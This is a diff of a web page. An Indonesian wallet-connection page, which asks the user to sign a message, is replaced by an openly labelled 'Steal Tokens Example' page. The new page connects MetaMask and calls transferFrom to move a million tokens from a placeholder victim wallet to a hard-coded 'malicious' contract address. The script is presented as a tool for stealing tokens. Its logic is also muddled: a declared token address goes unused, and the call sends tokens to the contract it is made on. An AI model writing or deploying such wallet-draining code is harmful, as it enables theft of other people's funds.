@@ -1,83 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connect Wallet to Smart Contract</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steal Tokens Example</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .button:disabled {
+            background-color: #ccc;
+        }
+    </style>
 </head>
 <body>
-  <h1>Hubungkan Wallet ke Smart Contract</h1>
-  <button id="connectWallet">Hubungkan Wallet</button>
-  <p><strong>Status Wallet:</strong> <span id="walletStatus">Belum Terhubung</span></p>
-  <p><strong>Smart Contract Address:</strong> <span id="contractStatus">Belum Terhubung</span></p>
 
-  <script>
-    const contractAddress = "0xc520027d3eB2600c5ea5e799ea6F355D05b8b6f6";
-    const abi = [
-      {
-        "inputs": [
-          { "internalType": "address", "name": "sender", "type": "address" },
-          { "internalType": "address", "name": "recipient", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-          { "internalType": "bool", "name": "", "type": "bool" }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
+    <h1>Steal Tokens Example</h1>
+    <p>Connect your wallet and execute the function to steal tokens from another wallet.</p>
 
-    let web3;
-    let userAccount;
+    <button id="connectWalletButton" class="button">Connect Wallet</button>
+    <button id="stealTokensButton" class="button" disabled>Steal Tokens</button>
 
-    document.getElementById("connectWallet").addEventListener("click", async () => {
-  if (window.ethereum) {
-    try {
-      // Menghubungkan wallet
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      web3 = new Web3(window.ethereum);
+    <script>
+        let provider;
+        let signer;
+        let maliciousContractAddress = "0xc520027d3eB2600c5ea5e799ea6F355D05b8b6f6"; // Contract address
+        let tokenAddress = "0xYourTokenAddress"; // Replace with token address
+        let contractABI = [
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "sender", "type": "address" },
+                    { "internalType": "address", "name": "recipient", "type": "address" },
+                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                ],
+                "name": "transferFrom",
+                "outputs": [ { "internalType": "bool", "name": "", "type": "bool" } ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
-      // Mendapatkan alamat wallet pengguna
-      userAccount = (await web3.eth.getAccounts())[0];
-      document.getElementById("walletStatus").textContent = "Terhubung: " + userAccount;
-
-      // Menambahkan tanda tangan
-      const message = "Saya ingin terhubung ke smart contract.";
-      const signature = await web3.eth.personal.sign(message, userAccount, "");
-      console.log("Tanda tangan:", signature);
-    } catch (error) {
-      console.error("Gagal menghubungkan wallet:", error);
-    }
-  } else {
-    alert("Metamask tidak ditemukan! Harap instal Metamask untuk melanjutkan.");
-  }
-});
-
-    document.getElementById("connectWallet").addEventListener("click", async () => {
-      if (window.ethereum) {
-        try {
-          // Meminta akses ke wallet
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          web3 = new Web3(window.ethereum);
-
-          // Mendapatkan akun pengguna
-          userAccount = (await web3.eth.getAccounts())[0];
-          document.getElementById("walletStatus").textContent = "Terhubung: " + userAccount;
-
-          // Inisialisasi contract
-          const contract = new web3.eth.Contract(abi, contractAddress);
-          document.getElementById("contractStatus").textContent = "Terhubung: " + contractAddress;
-        } catch (error) {
-          console.error("Gagal menghubungkan wallet:", error);
-          alert("Gagal menghubungkan wallet.");
+        async function connectWallet() {
+            if (window.ethereum) {
+                try {
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    signer = provider.getSigner();
+                    console.log("Wallet connected!");
+                    document.getElementById("stealTokensButton").disabled = false;
+                } catch (error) {
+                    console.error("Wallet connection failed:", error);
+                }
+            } else {
+                alert("Please install MetaMask to connect your wallet.");
+            }
         }
-      } else {
-        alert("Metamask tidak ditemukan! Harap instal Metamask untuk melanjutkan.");
-      }
-    });
-  </script>
+
+        async function stealTokens() {
+            try {
+                const contract = new ethers.Contract(maliciousContractAddress, contractABI, signer);
+                const victimAddress = "0xVictimWalletAddress"; // Replace with victim's wallet address
+                const amountToSteal = ethers.utils.parseUnits("1000000", 18); // Amount to steal, example: 1 million tokens (adjust as needed)
+
+                const tx = await contract.transferFrom(victimAddress, maliciousContractAddress, amountToSteal);
+                console.log("Steal tokens transaction sent:", tx.hash);
+
+                await tx.wait(); // Wait for the transaction to be mined
+                console.log("Tokens stolen successfully!");
+                alert("Tokens stolen successfully!");
+            } catch (error) {
+                console.error("Error stealing tokens:", error);
+                alert("Error stealing tokens. Please try again.");
+            }
+        }
+
+        document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
+        document.getElementById("stealTokensButton").addEventListener("click", stealTokens);
+    </script>
+
 </body>
 </html>
